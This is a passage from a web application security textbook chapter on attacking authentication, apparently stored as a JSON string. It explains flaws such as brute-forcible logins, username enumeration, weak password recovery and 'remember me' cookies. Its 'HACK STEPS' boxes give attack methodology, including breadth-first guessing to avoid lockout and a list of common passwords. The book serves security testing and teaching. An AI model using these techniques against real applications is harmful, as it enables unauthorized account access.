    "output": "70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 135\nChapter 6 ■ Attacking Authentication 135\nSome web applications employ client-side SSL certificates or cryptographic\nmechanisms implemented within smartcards. Because of the overhead of\nadministering and distributing these items, they are typically used only in\nsecurity-critical contexts where an application’s user base is small.\nThe HTTP-based authentication mechanisms (basic, digest, and Windows-\nintegrated) are rarely used on the Internet, and are much more commonly\nencountered in intranet environments where an organization’s internal users\ngain access to corporate applications by supplying their normal network or\ndomain credentials, which are processed by the application via one of these\ntechnologies.\nThird-party authentication services such as Microsoft Passport are occasion-\nally encountered, but at the present time have not been adopted on any signif-\nicant scale.\nMost of the vulnerabilities and attacks that arise in relation to authentication\ncan be applied to any of the technologies mentioned. Because of its over-\nwhelming dominance, we will describe each specific vulnerability and attack\nin the context of HTML forms-based authentication, and where relevant will\npoint towards any specific differences and attack methodologies that are rele-\nvant to the other available technologies.\nDesign Flaws in Authentication Mechanisms\nAuthentication functionality is subject to more design weaknesses than any\nother security mechanism commonly employed in web applications. Even in\nthe apparently simple, standard model where an application authenticates\nusers based on their username and password, shortcomings in the design of\nthis model can leave the application highly vulnerable to unauthorized access.\nBad Passwords\nMany web applications employ no or minimal controls over the quality of\nusers’ passwords. It is common to encounter applications that allow pass-\nwords that are:\n■■ Very short or blank\n■■ Common dictionary words or names\n■■ Set to the same as the username\n■■ Still set to a default value\nFigure 6-1 shows an example of weak password quality rules. End users\ntypically display little awareness of security issues. Hence, it is highly likely\nthat an application that does not enforce strong password standards will con-\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 136\n136 Chapter 6 ■ Attacking Authentication\ntain a large number of user accounts with weak passwords set. These pass-\nwords can be easily guessed by an attacker, granting them unauthorized\naccess to the application.\nFigure 6-1: An application that enforces weak password quality rules\nHACK STEPS\nAttempt to discover any rules regarding password quality:\n■ Review the web site for any description of the rules.\n■ If self-registration is possible, attempt to register several accounts with\ndifferent kinds of weak passwords to discover what rules are in place.\n■ If you control a single account and password change is possible, attempt\nto change your password to various weak values.\nNOTE If password quality rules are enforced only through client-side controls,\nthis is not itself a security issue because ordinary users will still be protected. It\nis not normally a threat to an application’s security that a crafty attacker can\nassign themselves a weak password.\nBrute-Forcible Login\nLogin functionality presents an open invitation for an attacker to try and guess\nusernames and passwords, and so gain unauthorized access to the application.\nIf the application allows an attacker to make repeated login attempts with dif-\nferent passwords until the correct one is guessed, then it is highly vulnerable\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 137\nChapter 6 ■ Attacking Authentication 137\neven to an amateur attacker who manually enters some common usernames\nand passwords into their browser. Values frequently encountered even in pro-\nduction systems include:\n■■ test\n■■ testuser\n■■ admin\n■■ administrator\n■■ demo\n■■ demouser\n■■ password\n■■ password1\n■■ password123\n■■ qwerty\n■■ test123\n■■ letmein\n■■ [organization’s name]\nIn this situation, any serious attacker will use automated techniques to\nattempt to guess passwords, based on lengthy lists of common values. Given\ntoday’s bandwidth and processing capabilities, it is possible to make thou-\nsands of login attempts per minute from a standard PC and DSL connection.\nEven the most robust passwords will be eventually broken in this scenario.\nVarious techniques and tools for using automation in this way are described\nin detail in Chapter 13. Figure6-2 demonstrates a successful password guess-\ning attack against a single account using Burp Intruder. The successful login\nattempt can be clearly distinguished by the difference in the HTTP response\ncode, the response length, and the absence of the “login incorrect” message.\nNOTE In some applications, client-side controls are employed in an attempt\nto prevent password-guessing attacks. For example, an application may set a\ncookie such as failedlogins=1, and increment this following each\nunsuccessful attempt. When a certain threshold is reached, the server will\ndetect this in the submitted cookie and refuse to process the login attempt.\nThis kind of client-side defense may prevent a manual attack being launched\nusing only a browser, but it can of course be trivially bypassed as described in\nChapter 5.\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 138\n138 Chapter 6 ■ Attacking Authentication\nFigure 6-2: A successful password-guessing attack\nHACK STEPS\n■ Manually submit several bad login attempts for an account you control,\nmonitoring the error messages received.\n■ After around 10 failed logins, if the application has not returned any\nmessage about account lockout, attempt to login correctly. If this suc-\nceeds, there is probably no account lockout policy.\n■ If you do not control any accounts, attempt to enumerate a valid username\n(see the “Verbose Failure Messages” section) and make several bad logins\nusing this, monitoring for any error messages about account lockout.\n■ To mount a brute-force attack, first identify a difference in the application’s\nbehavior in response to successful and failed logins, which can be used to\ndiscriminate between these during the course of the automated attack.\n■ Obtain a list of enumerated or common usernames and a list of common\npasswords. Use any information obtained about password quality rules\nto tailor the password list so as to avoid superfluous test cases.\n■ Use a suitable tool or a custom script to quickly generate login requests\nusing all permutations of these usernames and passwords. Monitor the\nserver’s responses to identify login attempts that are successful. Chapter\n13 describes in detail various techniques and tools for performing cus-\ntomised attacks using automation.\n■ If you are targeting several usernames at once, it is usually preferable to\nperform this kind of brute-force attack in a breadth-first rather than a\ndepth-first manner. This involves iterating through a list of passwords\n(starting with the most common) and attempting each password in turn\non every username. This approach has two benefits: first, you will dis-\ncover accounts with common passwords more quickly, and second, you\nare less likely to trigger any account lockout defenses, because there is a\ntime delay between successive attempts using each individual account.\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 139\nChapter 6 ■ Attacking Authentication 139\nVerbose Failure Messages\nA typical login form requires the user to enter two pieces of information (user-\nname and password), and some applications require several more (for exam-\nple, date of birth, a memorable place, or a PIN number).\nWhen a login attempt fails, you can of course infer that at least one piece of\ninformation was incorrect. However, if the application informs you as to\nwhich piece of information was invalid, you can exploit this behavior to con-\nsiderably diminish the effectiveness of the login mechanism.\nIn the simplest case, where a login requires a username and password, an\napplication might respond to a failed login attempt by indicating whether the\nreason for the failure was an unrecognized username or the wrong password,\nas illustrated in Figure6-3.\nFigure 6-3: Verbose login failure messages indicating when a valid username has been\nguessed\nIn this instance, you can use an automated attack to iterate through a large\nlist of common usernames to enumerate which of these are valid. Of course,\nusernames are not normally considered a secret (they are not masked during\nlogin, for instance). However, providing an easy means for an attacker to iden-\ntify valid usernames increases the likelihood that they will compromise the\napplication with a given level of time, skill, and effort. A list of enumerated\nusernames can be used as the basis for various subsequent attacks, including\npassword guessing, attacks on user data or sessions, or social engineering.\nNOTE Many authentication mechanisms disclose usernames either implicitly\nor explicitly. In a web mail account, the username is often the email address,\nwhich is common knowledge by design. Many other sites expose usernames\nwithin the application without considering the advantage this grants to an\nattacker, or allow usernames to be easily guessed (for example, user1842).\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 140\n140 Chapter 6 ■ Attacking Authentication\nIn more complex login mechanisms, where an application requires the user\nto submit several pieces of information, or proceed through several stages,\nverbose failure messages or other discriminators can enable an attacker to tar-\nget each stage of the login process in turn, increasing the likelihood that they\nwill gain unauthorized access.\nNOTE This vulnerability may arise in more subtle ways than illustrated\nhere. Even if the error messages returned in response to a valid and invalid\nusername are superficially similar, there may be small differences between\nthem that can be used to enumerate valid usernames. For example, if multiple\ncode paths within the application return the “same” failure message, there may\nbe minor typographical differences between each instance of the message. In\nsome cases, the application’s responses may be identical on-screen but contain\nsubtle differences hidden within the HTML source, such as comments or layout\ndifferences. If no obvious means of enumerating usernames presents itself, you\nshould perform a very close comparison of the application’s responses to valid\nand invalid usernames.\nHACK STEPS\n■ If you already know one valid username (for example, an account you\ncontrol), submit one login using this username and an incorrect pass-\nword, and another login using a completely random username.\n■ Record every detail of the server’s responses to each login attempt,\nincluding the status code, any redirects, information displayed on screen,\nand any differences hidden away in the HTML page source. Use your\nintercepting proxy to maintain a full history of all traffic to and from the\nserver.\n■ Attempt to discover any obvious or subtle differences in the server’s\nresponses to the two login attempts.\n■ If this fails, repeat the exercise everywhere within the application where\na username can be submitted (for example, self-registration, password\nchange, and forgotten password).\n■ If a difference is detected in the server’s responses to valid and invalid\nusernames, obtain a list of common usernames and use a custom script\nor automated tool to quickly submit each username and filter the\nresponses that signify that the username is valid (see Chapter 13).\n(continued)\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 141\nChapter 6 ■ Attacking Authentication 141\nHACK STEPS (continued)\n■ Before commencing your enumeration exercise, verify whether the appli-\ncation performs any account lockout after a certain number of failed\nlogin attempts (see the “Brute-Forcible Login” section). If so, it is desir-\nable to design your enumeration attack with this fact in mind. For exam-\nple, if the application will grant you only three failed login attempts with\nany given account, you run the risk of “wasting” one of these for every\nusername that you discover through automated enumeration. Therefore,\nwhen performing your enumeration attack, do not submit a completely\nfar-fetched password with each login attempt, but rather submit either\n(a) a single common password such as “password1” or (b) the username\nitself as the password. If password quality rules are weak, it is highly\nlikely that some of the attempted logins that you perform as part of your\nenumeration exercise will actually be successful and disclose both the\nusername and password in one single hit. To implement option (b) and\nset the password field to the same as the username, you can use the\n“battering ram” attack mode in Burp Intruder to insert the same payload\nat multiple positions in your login request.\nEven if an application’s responses to login attempts containing valid and\ninvalid usernames are identical in every intrinsic respect, it may yet be possi-\nble to enumerate usernames based on the time taken for the application to\nrespond to the login request. Applications often perform very different back-\nend processing on a login request, depending on whether it contains a valid\nusername. For example, when a valid username is submitted, the application\nmay retrieve user details from a back-end database, perform various process-\ning on these details (for example, checking whether the account is expired),\nand then validate the password (which may involve a resource-intensive hash\nalgorithm), before returning a generic message if the password is incorrect.\nThe timing difference between the two responses may be too subtle to detect\nwhen working with only a browser, but an automated tool may be able to dis-\ncriminate between them. Even if the results of such an exercise contain a large\nratio of false positives, it is still better to have a list of 100 usernames approxi-\nmately 50% of which are valid than a list of 10,000 usernames approximately\n0.5% of which are valid. See Chapter 14 for a detailed methodology for how to\ndetect and exploit this type of timing difference to extract information from the\napplication.\nTIP In addition to the login functionality itself, there may be other sources of\ninformation where you can obtain valid usernames. Review all of the source code\ncomments discovered during application mapping (see Chapter 4) to identify any\napparent usernames. Any email addresses of developers or other personnel\nwithin the organization may be valid usernames, either in full or just the user-\nspecific prefix. Any accessible logging functionality may disclose usernames.\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 142\n142 Chapter 6 ■ Attacking Authentication\nVulnerable Transmission of Credentials\nIf an application uses an unencrypted HTTP connection to transmit login cre-\ndentials, an eavesdropper who is suitably positioned on the network will of\ncourse be able to intercept them. Depending on the user’s location, potential\neavesdroppers may reside:\n■■ On the user’s local network\n■■ Within the user’s IT department\n■■ Within the user’s ISP\n■■ On the Internet backbone\n■■ Within the ISP hosting the application\n■■ Within the IT department managing the application\nNOTE Any of these locations may be occupied by authorized personnel but\nalso potentially by an external attacker who has compromised the relevant\ninfrastructure through some other means. Even if the intermediaries on a\nparticular network are believed to be trusted, it is safer to use secure transport\nmechanisms when passing sensitive data over it.\nEven if login occurs over HTTPS, credentials may still be disclosed to unau-\nthorized parties if the application handles them in an unsafe manner:\n■■ If credentials are transmitted as query string parameters, as opposed to\nin the body of a POSTrequest, then these are liable to be logged in vari-\nous places—for example, within the user’s browser history, within the\nweb server logs, and within the logs of any reverse proxies employed\nwithin the hosting infrastructure. If an attacker succeeds in compromis-\ning any of these resources, then he may be able to escalate privileges by\ncapturing the user credentials stored there.\n■■ Although most web applications do use the body of a POSTrequest to\nsubmit the HTML login form itself, it is surprisingly common to see the\nlogin request being handled via a redirect to a different URL with the\nsame credentials passed as query string parameters. Why application\ndevelopers consider it necessary to perform these bounces is not clear,\nbut having elected to do so, it is easier to implement them as 302 redi-\nrects to a URL than as POSTrequests using a second HTML form sub-\nmitted via JavaScript.\n■■ Web applications sometimes store user credentials in cookies, usually to\nimplement poorly designed mechanisms for login, password change,\n“remember me,” and so on. These credentials are vulnerable to capture\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 143\nChapter 6 ■ Attacking Authentication 143\nvia attacks that compromise user cookies, and in the case of persistent\ncookies, by anyone who gains access to the client’s local file system.\nEven if the credentials are encrypted, an attacker can still simply replay\nthe cookie and so log in as a user without actually knowing her creden-\ntials. Chapter 12 describes various ways in which an attacker can target\nother users to capture their cookies.\nMany applications use HTTP for unauthenticated areas of the application\nand switch to HTTPS at the point of login. If this is the case, then the correct\nplace to switch to HTTPS is when the login page is loaded in the browser,\nenabling a user to verify that the page is authentic before entering credentials.\nHowever, it is common to encounter applications that load the login page itself\nusing HTTP, and switch to HTTPS at the point where credentials are submit-\nted. This is unsafe, because a user cannot verify the authenticity of the login\npage itself and so has no assurance that the credentials will be submitted\nsecurely. A suitably positioned attacker can intercept and modify the login\npage, changing the target URL of the login form to use HTTP. By the time an\nastute user realizes that the credentials have been submitted using HTTP, they\nwill have been compromised.\nHACK STEPS\n■■ Carry out a successful login while monitoring all traffic in both directions\nbetween the client and server.\n■■ Identify every case in which the credentials are transmitted in either\ndirection. You can set interception rules in your intercepting proxy to flag\nmessages containing specific strings (see Chapter 19).\n■■ If any instances are found in which credentials are submitted in a URL\nquery string, or as a cookie, or are transmitted back from the server to\nthe client, understand what is happening and try to ascertain what pur-\npose the application developers were attempting to achieve. Try to find\nevery means by which an attacker might interfere with the application’s\nlogic to compromise other users’ credentials.\n■■ If any sensitive information is transmitted over an unencrypted channel,\nthis is, of course, vulnerable to interception.\n■■ If no cases of actual credentials being transmitted insecurely are identi-\nfied, pay close attention to any data that appears to be encoded or\nobfuscated. If this includes sensitive data, it may be possible to reverse\nengineer the obfuscation algorithm.\n■■ If credentials are submitted using HTTPS but the login form is loaded\nusing HTTP, then the application is vulnerable to a man-in-the-middle\nattack, which may be used to capture credentials.\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 144\n144 Chapter 6 ■ Attacking Authentication\nPassword Change Functionality\nSurprisingly, many web applications do not provide any way for users to\nchange their password. However, this functionality is necessary for a well-\ndesigned authentication mechanism for two reasons:\n■■ Periodic enforced password change mitigates the threat of password\ncompromise by reducing the window in which a given password can be\ntargeted in a guessing attack and by reducing the window in which a\ncompromised password can be used without detection by the attacker.\n■■ Users who suspect that their passwords may have been compromised\nneed to be able to quickly change their password to reduce the threat of\nunauthorized use.\nAlthough it is a necessary part of an effective authentication mechanism,\npassword change functionality is often vulnerable by design. It is frequently\nthe case that vulnerabilities that are deliberately avoided in the main login\nfunction reappear in the password change function. There are many web\napplications whose password change functions are accessible without authen-\ntication and that:\n■■ Provide a verbose error message indicating whether the requested user-\nname is valid.\n■■ Allow unrestricted guesses of the “existing password” field.\n■■ Only check whether the “new password” and “confirm new password”\nfields have the same value after validating the existing password,\nthereby allowing an attack to succeed in discovering the existing pass-\nword noninvasively.\nHACK STEPS\n■ Identify any password change functionality within the application. If this\nis not explicitly linked from published content, it may still be imple-\nmented. Chapter 4 describes various techniques for discovering hidden\ncontent within an application.\n■ Make various requests to the password change function, using invalid\nusernames, invalid existing passwords, and mismatched “new password”\nand “confirm new password” values.\n■ Try to identify any behavior that can be used for username enumeration\nor brute-force attacks (as described in the “Brute-Forcible Login” and\n“Verbose Failure Messages” sections).\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 145\nChapter 6 ■ Attacking Authentication 145\nTIP If the password change form is only accessible by authenticated users\nand does not contain a username field, it may still be possible to supply an\narbitrary username. The form may store the username in a hidden field, which\ncan easily be modified. If not, try supplying an additional parameter containing\nthe username, using the same parameter name as is used in the main login\nform. This trick sometimes succeeds in overriding the username of the current\nuser, enabling you to brute force the credentials of other users even when this\nis not possible at the main login.\nForgotten Password Functionality\nLike password change functionality, mechanisms for recovering from a forgot-\nten password situation often introduce problems that may have been avoided\nin the main login function, such as username enumeration.\nIn addition to this range of defects, design weaknesses in forgotten pass-\nword functions frequently make this the weakest link at which to attack the\napplication’s overall authentication logic. Several kinds of design weaknesses\ncan often be found:\n■■ The forgotten password functionality often involves presenting the user\nwith a secondary challenge in place of the main login, as shown in Fig-\nure6-4. This challenge is often much easier for an attacker to respond to\nthan attempting to guess the user’s password. Questions about moth-\ners’ maiden names, memorable dates, favorite colors, and the like will\ngenerally have a much smaller set of potential answers than the set of\npossible passwords. Further, they often concern information that is\npublicly known or that a determined attacker can discover with a\nmodest degree of effort.\nFigure 6-4: A secondary challenge used in an account\nrecovery function\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 146\n146 Chapter 6 ■ Attacking Authentication\nIn many cases, the application allows users to set their own password\nrecovery challenge and response during registration, and users are\ninclined to set extremely insecure challenges, presumably on the false\nassumption that only they will ever be presented with them, for example:\n“Do I own a boat?” In this situation, an attacker wishing to gain access\ncan use an automated attack to iterate through a list of enumerated or\ncommon usernames, log all of the password recovery challenges, and\nselect those that appear most easily guessable. (See Chapter 13 for tech-\nniques regarding how to grab this kind of data in a scripted attack.)\n■■ As with password change functionality, application developers com-\nmonly overlook the possibility of brute forcing the response to a pass-\nword recovery challenge, even when they block this attack on the main\nlogin page. If an application allows unrestricted attempts to answer\npassword recovery challenges, then it is highly likely to be compro-\nmised by a determined attacker.\n■■ In some applications, the recovery challenge is replaced with a simple\npassword “hint” that is configurable by users during registration. Users\ncommonly set extremely obvious hints, even one that is identical to the\npassword itself, on the false assumption that only they will ever see them.\nAgain, an attacker with a list of common or enumerated usernames can\neasily capture a large number of password hints and then start guessing.\n■■ The mechanism by which an application enables users to regain control\nof their account after correctly responding to a challenge is often vul-\nnerable. One reasonably secure means of implementing this is to send a\nunique, unguessable, time-limited recovery URL to the email address\nthat the user provided during registration. Visiting this URL within a\nfew minutes enables the user to set a new password. However, other\nmechanisms for account recovery are often encountered that are inse-\ncure by design:\n■■ Some applications disclose the existing, forgotten password to the\nuser after successful completion of a challenge, enabling an attacker\nto use the account indefinitely without any risk of detection by the\nowner. Even if the account owner subsequently changes the blown\npassword, the attacker can simply repeat the same challenge to\nobtain the new password.\n■■ Some applications immediately drop the user into an authenticated\nsession after successful completion of a challenge, again enabling an\nattacker to use the account indefinitely without detection, and with-\nout ever needing to know the user’s password.\n■■ Some applications employ the mechanism of sending a unique\nrecovery URL but send this to an email address specified by the user\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 147\nChapter 6 ■ Attacking Authentication 147\nat the time the challenge is completed. This provides absolutely no\nenhanced security of the recovery process beyond possibly logging\nthe email address used by an attacker.\nTIP Even if the application does not provide an on-screen field for you to\nprovide an email address to receive the recovery URL, the application may\ntransmit the address via a hidden form field or cookie. This presents a double\nopportunity: you can discover the email address of the user you have\ncompromised, and you can modify its value to receive the recovery URL at an\naddress of your choosing.\n■■ Some applications allow users to reset their password’s value directly\nafter successful completion of a challenge and do not send any email\nnotification to the user. This means that the compromising of an\naccount by an attacker will not be noticed until the owner happens to\nattempt to log in again, and may even remain unnoticed if the owner\nassumes that they must have forgotten their own password and so\nresets it in the same way. An attacker who simply desires someaccess\nto the application can then compromise a different user’s account for\na period and so continue using the application indefinitely.\nHACK STEPS\n■ Identify any forgotten password functionality within the application. If\nthis is not explicitly linked from published content, it may still be imple-\nmented (see Chapter 4).\n■ Understand how the forgotten password function works by doing a com-\nplete walk-through using an account you control.\n■ If the mechanism uses a challenge, determine whether users are able to\nset or select their own challenge and response. If so, use a list of enu-\nmerated or common usernames to harvest a list of challenges, and\nreview this for any that appear easily guessable.\n■ If the mechanism uses a password “hint,” do the same exercise to har-\nvest a list of password hints, and target any that are easily guessable.\n■ Try to identify any behavior in the forgotten password mechanism that\ncan be exploited as the basis for username enumeration or brute-force\nattacks (see the previous details).\n■ If the application generates an email containing a recovery URL in\nresponse to a forgotten password request, obtain a number of these\nURLs, and attempt to identify any patterns that may enable you to predict\nthe URLs issued to other users. Employ the same techniques as are rele-\nvant to analyzing session tokens for predictability (see Chapter 7).\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 148\n148 Chapter 6 ■ Attacking Authentication\n“Remember Me” Functionality\nApplications often implement “remember me” functions as a convenience to\nusers, to prevent them needing to reenter their username and password each\ntime they use the application from a specific computer. These functions are\noften insecure by design and leave the user exposed to attack both locally and\nby users on othercomputers:\n■■ Some “remember me” functions are implemented using a simple per-\nsistent cookie, such as RememberUser=peterwiener(see Figure6-5).\nWhen this cookie is submitted to the initial application page, the appli-\ncation trusts the cookie to authenticate the user, and creates an applica-\ntion session for that person, bypassing the login. An attacker can use a\nlist of common or enumerated usernames to gain full access to the\napplication without any authentication.\nFigure 6-5: A vulnerable “remember me” function\n■■ Some “remember me” functions set a cookie which does not contain\nthe username but rather a kind of persistent session identifier—for\nexample, RememberUser=1328. When the identifier is submitted to the\nlogin page, the application looks up the user associated with it and\ncreates an application session for that user. As with ordinary session\ntokens, if the session identifiers of other users can be predicted or\nextrapolated, an attacker can iterate through a large number of poten-\ntial identifiers to find those associated with application users, and so\ngain access to their accounts without authentication. See Chapter 7 for\ntechniques for performing this attack.\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 149\nChapter 6 ■ Attacking Authentication 149\n■■ Even if the information stored in a cookie for re-identifying users is\nsuitably protected (e.g., encrypted) to prevent other users from deter-\nmining or guessing it, the information may still be vulnerable to cap-\nture through a bug such as cross-site scripting (see Chapter 12).\nHACK STEPS\n■ Activate any “remember me” functionality, and determine whether the\nfunctionality indeed does fully “remember” the user or whether it only\nremembers their username and still requires them to enter a password\non subsequent visits. If the latter is the case, the functionality is much\nless likely to expose any security flaw.\n■ Closely inspect all persistent cookies that are set. Look for any saved\ndata that identifies the user explicitly or appears to contain some pre-\ndictable identifier of the user.\n■ Even where data stored appears to be heavily encoded or obfuscated,\nreview this closely and compare the results of “remembering” several\nvery similar usernames and/or passwords to identify any opportunities\nfor reverse engineering the original data. Here, use the same techniques\nthat are described in Chapter 7 for detecting meaning and patterns in\nsession tokens.\n■ Attempt to modify the contents of the persistent cookie to try and con-\nvince the application that another user has saved his details on your\ncomputer.\nUser Impersonation Functionality\nSome applications implement the facility for a privileged user of the applica-\ntion to impersonate other users, in order to access data and carry out actions\nwithin their user context. For example, some banking applications allow\nhelpdesk operators to verbally authenticate a telephone user and then switch\ntheir application session into that user’s context in order to assist them.\nVarious design flaws commonly exist within impersonation functionality:\n■■ It may be implemented as a “hidden” function, which is not subject to\nproper access controls. For example, anyone who knows or guesses the\nURL /admin/ImpersonateUser.jspmay be able to make use of the\nfunction and impersonate any other user (see Chapter 8).\n■■ The application may trust user-controllable data when determining\nwhether the user is performing impersonation. For example, in addition\nto a valid session token, a user may also submit a cookie specifying\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 150\n150 Chapter 6 ■ Attacking Authentication\nwhich account their session is currently using. An attacker may be able\nto modify this value and gain access to other user accounts without\nauthentication, as shown in Figure6-6.\nFigure 6-6: A vulnerable user impersonation function\n■■ If an application allows administrative users to be impersonated, then\nany weakness in the impersonation logic may result in a vertical privi-\nlege escalation vulnerability—rather than simply gaining access to\nother ordinary users’ data, an attacker may gain full control of the\napplication.\n■■ Some impersonation functionality is implemented as a simple “back-\ndoor” password that can be submitted to the standard login page along\nwith any username in order to authenticate as that user. This design is\nhighly insecure for many reasons, but the biggest opportunity for\nattackers is that they are likely to discover this password when per-\nforming standard attacks such as brute forcing of the login. If the back-\ndoor password is matched before the user’s actual password, then the\nattacker is likely to discover the function of the backdoor password and\nso gain access to every user’s account. Similarly, a brute-force attack\nmight result in two different “hits,” thereby revealing the backdoor\npassword as shown in Figure6-7.\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 151\nChapter 6 ■ Attacking Authentication 151\nFigure 6-7: A password-guessing attack with two “hits,”\nindicating the presence of a backdoor password\nHACK STEPS\n■ Identify any impersonation functionality within the application. If this is\nnot explicitly linked from published content, it may still be implemented\n(see Chapter 4).\n■ Attempt to use the impersonation functionality directly to impersonate\nother users.\n■ Attempt to manipulate any user-supplied data that is processed by the\nimpersonation function in an attempt to impersonate other users. Pay\nparticular attention to any cases where your username is being submit-\nted other than during normal login.\n■ If you succeed in making use of the functionality, attempt to impersonate\nany known or guessed administrative users, in order to elevate privileges.\n■ When carrying out password guessing attacks (see the “Brute-Forcible\nLogin” section), review whether any users appear to have more than one\nvalid password, or whether a specific password has been matched\nagainst several usernames. Also, log in as many different users with the\ncredentials captured in a brute-force attack, and review whether every-\nthing appears normal. Pay close attention to any “logged in as X” status\nmessage.\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 152\n152 Chapter 6 ■ Attacking Authentication\nIncomplete Validation of Credentials\nWell-designed authentication mechanisms enforce various requirements on\npasswords, such as a minimum length or the presence of both uppercase and\nlowercase characters. Correspondingly, some poorly designed authentication\nmechanisms not only do not enforce these good practices but also do not take\naccount of users’ own attempts to comply with them.\nFor example, some applications truncate passwords and so only validate the\nfirst ncharacters. Some applications perform a case-insensitive check of pass-\nwords. Some applications strip out unusual characters (sometimes on the pre-\ntext of performing input validation) before checking passwords.\nEach of these limitations on password validation reduces by an order of\nmagnitude the number of variations available in the set of possible passwords.\nThrough experimentation, you can determine whether a password is being\nfully validated, or whether any limitations are in effect. You can then fine-tune\nyour automated attacks against the login to remove unnecessary test cases,\nthereby massively reducing the number of requests necessary to compromise\nuser accounts.\nHACK STEPS\n■ Using an account you control, attempt to log in with variations on your\nown password: removing the last character, changing the case of a char-\nacter, and removing any special typographical characters. If any of these\nattempts is successful, continue experimenting to try and understand\nwhat validation is actually occurring.\n■ Feed any results back into your automated password guessing attacks, to\nremove superfluous test cases and improve the chances of success.\nNon-Unique Usernames\nSome applications that support self-registration allow users to specify their\nown username, and do not enforce a requirement that usernames be unique.\nAlthough rare, the authors have encountered more than one application with\nthis behavior.\nThis represents a design flaw for two reasons:\n■■ One user who shares a username with another user may also happen to\nselect the same password as that user, either during registration or in a\nsubsequent password change. In this eventuality, the application will\neither reject the second user’s chosen password or will allow two\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 153\nChapter 6 ■ Attacking Authentication 153\naccounts to have identical credentials. In the first instance, the applica-\ntion’s behavior will effectively disclose to one user the credentials of a\ndifferent user. In the second instance, subsequent logins by one of the\nusers will result in access to the other user’s account.\n■■ An attacker may exploit this behavior to carry out a successful brute-\nforce attack, even though this may not be possible elsewhere due to\nrestrictions on failed login attempts. An attacker can register a specific\nusername multiple times with different passwords, while monitoring\nfor the differential response that indicates that an account with that\nusername and password already existed. The attacker will have ascer-\ntained a target user’s password without making a single attempt to log\nin as that user.\nBadly designed self-registration functionality can also provide a means for\nusername enumeration. If an application disallows duplicate usernames, then\nan attacker may attempt to register large numbers of common usernames to\nidentify the existing usernames that are rejected.\nHACK STEPS\n■ If self-registration is possible, attempt to register the same username\ntwice with different passwords.\n■ If the application blocks the second registration attempt, you can exploit\nthis behavior to enumerate existing usernames even if this is not possi-\nble on the main login page or elsewhere. Make multiple registration\nattempts with a list of common usernames to identify the already regis-\ntered names that the application blocks.\n■ If the registration of duplicate usernames succeeds, attempt to register\nthe same username twice with the same password, and determine the\napplication’s behavior:\n■ If an error message results, you can exploit this behavior to carry out a\nbrute-force attack, even if this is not possible on the main login page.\nTarget an enumerated or guessed username, and attempt to register\nthis username multiple times with a list of common passwords. When\nthe application rejects one specific password, you have probably\nfound the existing password for the targeted account.\n■ If no error message results, log in using the credentials you specified\nand see what happens. You may need to register several users, and\nmodify different data held within each account, to understand\nwhether this behavior can be used to gain unauthorized access to\nother users’ accounts.\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 154\n154 Chapter 6 ■ Attacking Authentication\nPredictable Usernames\nSome applications automatically generate account usernames according to\nsome predictable sequence (for example, cust5331, cust5332, etc.). When an\napplication behaves like this, an attacker who can discern the sequence can\nvery quickly arrive at a potentially exhaustive list of all valid usernames,\nwhich can be used as the basis for further attacks. Unlike enumeration meth-\nods that rely on making repeated requests driven by wordlists, this means of\ndetermining usernames can be carried out very non-intrusively with minimal\ninteraction with the application.\nHACK STEPS\n■ If usernames are generated by the application, try to obtain several user-\nnames in quick succession and determine whether any sequence or pat-\ntern can be discerned.\n■ If so, extrapolate backwards to obtain a list of possible valid usernames.\nThis can be used as the basis for a brute-force attack against the login\nand other attacks where valid usernames are required, such as the\nexploitation of access control flaws (see Chapter 8).\nPredictable Initial Passwords\nIn some applications, users are created all at once or in sizeable batches and are\nautomatically assigned initial passwords, which are then distributed to them\nthrough some means. The means of generating passwords may enable an\nattacker to predict the passwords of other application users. This kind of vul-\nnerability is more common on intranet-based corporate applications—for\nexample, where every employee has an account created on their behalf, and\nreceives a printed notification of their password.\nIn the most vulnerable cases, all users receive the same password, or one\nclosely derived from their username or job function. In other cases, generated\npasswords may contain sequences that could be identified or guessed with\naccess to a very small sample of initial passwords.\nHACK STEPS\n■ If passwords are generated by the application, try to obtain several pass-\nwords in quick succession and determine whether any sequence or pat-\ntern can be discerned.\n■ If so, extrapolate the pattern to obtain a list of passwords for other appli-\ncation users.\n70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 155\nChapter 6 ■ Attacking Authentication 155\nHACK STEPS (continued)\n■ If passwords demonstrate a pattern that can be correlated with user-\nnames, you can try to log in using known or guessed usernames and the\ncorresponding inferred passwords.\n■ Otherwise, you can use the list of inferred passwords as the basis for a\nbrute-force attack with a list of enumerated or common usernames.\nInsecure Distribution of Credentials\nMany applications employ a process in which credentials for newly created\naccounts are distributed to users out-of-band of their normal interaction with\nthe application (for example, via post or email). Sometimes, this is done for rea-\nsons motivated by security concerns—for example, to provide assurance that\nthe postal or email address supplied by the user actually belongs to that person.\nIn some cases, this process can present a security risk. For example, if the\nmessage distributed contains both username and password, there is no time\nlimit on their use, and there is no requirement for the user to change password\non first login, then it is highly likely that a large number, even a majority, of\napplication users will not modify their initial credentials and that the distribu-\ntion messages will remain in existence for a lengthy period during which they\nmay be accessed by an unauthorized party.\nSometimes, what is distributed is not the credentials themselves, but rather\nan “account activation” URL, which enables users to set their own initial pass-\nword. If the series of these URLs sent to successive users manifests any kind of\nsequence, then an attacker can identify this by registering multiple users in\nclose succession, and then infer the activation URLs sent to recent and forth-\ncoming users.\nHACK STEPS\n■ Obtain a new account. If you are not required to set all credentials during\nregistration, determine the means by which the application distributes\ncredentials to new users.\n■ If an account activation URL is used, try to register several new accounts\nin close succession and identify any sequence in the URLs you receive. If\na pattern can be 